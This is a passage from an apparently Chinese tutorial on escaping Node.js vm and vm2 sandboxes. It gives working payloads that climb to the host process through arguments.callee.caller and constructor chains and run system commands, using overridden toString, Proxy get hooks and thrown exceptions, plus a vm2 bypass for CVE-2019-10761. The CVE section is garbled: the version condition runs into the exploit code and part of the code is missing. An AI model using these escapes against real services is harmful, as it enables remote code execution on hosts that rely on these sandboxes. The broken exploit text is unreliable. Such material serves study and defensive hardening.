          const cc = arguments.callee.caller;
          const p = (cc.constructor.constructor('return process'))();
          return p.mainModule.require('child_process').execSync('whoami').toString()
        }
        return a
      })()`;
    const sandbox = Object.create(null);
    const context = new vm.createContext(sandbox);
    const res = vm.runInContext(script, context);
    console.log('Hello ' + res)
我们在沙箱内先创建了一个对象，并且将这个对象的toString方法进行了重写，通过`arguments.callee.caller`获得到沙箱外的一个对象，利用这个对象的构造函数的构造函数返回了process，再调用process进行rce，沙箱外在console.log中通过字符串拼接的方式触发了这个重写后的toString函数。
如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，我们可以用`Proxy`来劫持属性
[Proxy 和 Reflect - 掘金 (juejin.cn)](https://juejin.cn/post/6844904090116292616)
    const vm = require("vm");
    const script = 
    `
    (() =>{
        const a = new Proxy({}, {
            get: function(){
                const cc = arguments.callee.caller;
                const p = (cc.constructor.constructor('return process'))();
                return p.mainModule.require('child_process').execSync('whoami').toString();
            }
        })
        return a
    })()
    `;
    const sandbox = Object.create(null);
    const context = new vm.createContext(sandbox);
    const res = vm.runInContext(script, context);
    console.log(res.abc)
触发利用链的逻辑就是我们在`get:`这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。
如果沙箱的返回值返回的是我们无法利用的对象或者没有返回值应该怎么进行逃逸呢？
我们可以借助异常，将沙箱内的对象抛出去，然后在外部输出：
    const vm = require("vm");
    const script = 
    `
        throw new Proxy({}, {
            get: function(){
                const cc = arguments.callee.caller;
                const p = (cc.constructor.constructor('return process'))();
                return p.mainModule.require('child_process').execSync('whoami').toString();
            }
        })
    `;
    try {
        vm.runInContext(script, vm.createContext(Object.create(null)));
    }catch(e) {
        console.log("error:" + e) 
    }
这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。
## **0x06 vm2**
通过上面几个例子可以看出来vm沙箱隔离功能较弱，有很多逃逸的方法，所以第三方包vm2在vm的基础上做了一些优化，我们看一下这些优化具体是怎么实现的。
安装vm2包：
    npm install vm2
整个vm2包下是这样的结构：
  * `cli.js`实现了可以在命令行中调用vm2 也就是bin下的vm2。
  * `contextify.js`封装了三个对象：`Contextify Decontextify propertyDescriptor`，并且针对global的Buffer类进行了代理。
  * `main.js` 是vm2执行的入口，导出了`NodeVM VM`这两个沙箱环境，还有一个`VMScript`实际上是封装了`vm.Script`。
  * `sandbox.js`针对global的一些函数和变量进行了拦截，比如`setTimeout，setInterval`等
vm2相比vm做出很大的改进，其中之一就是利用了es6新增的proxy特性，从而使用钩子拦截对`constructor和__proto__`这些属性的访问。
先用vm2演示一下：
    const {VM, VMScript} = require('vm2');
    const script = new VMScript("let a = 2;a;");
    console.log((new VM()).run(script));
`VM`是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化后调用其中的run方法就可以运行一段脚本。
那么vm2在运行这两行代码时都做了什么事：
可以发现相比于vm的沙箱环境，vm2最重要的一步就是引入`sandbox.js`并针对context做封装。
那么vm2具体是怎么实现对context的封装？
vm2出现过多次逃逸的问题，所以现有的代码被进行了大量修改，为了方便分析需要使用较老版本的vm2，但github上貌似将3.9以前的版本全都删除了，所以我这里也找不到对应的资源了，代码分析也比较麻烦，直接移步链接：
[vm2实现原理分析-安全客 - 安全资讯平台
(anquanke.com)](https://www.anquanke.com/post/id/207283#h2-1)
## **0x07 vm2中的沙箱绕过**
### **CVE-2019-10761**
该漏洞要求vm2版本f.constructor("return process")()
      }
    };
    try{
      Buffer.from(new Map());
    }catch(f){
      Symbol = {};
      f(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
    }
在vm2的原理中提到vm2会为对象配置代理并初始化，如果对象是以下类型：
就会return `Decontextify.instance`
函数，这个函数中用到了Symbol全局对象，我们可以通过劫持Symbol对象的getter并抛出异常，再在沙箱内拿到这个异常对象就可以了
**参考文章** ：
​ 
​ 
​ 
​
[https://blog.csdn.net/shawdow_bug/article/details/120072209?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&utm_relevant_index=2](https://blog.csdn.net/shawdow_bug/article/details/120072209?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&utm_relevant_index=2)
[Proxy 和 Reflect - 掘金 (juejin.cn)](https://juejin.cn/post/6844904090116292616)
[vm2实现原理分析-安全客 - 安全资讯平台
(anquanke.com)](https://www.anquanke.com/post/id/207283#h2-1)
​ **P神知识星球**
​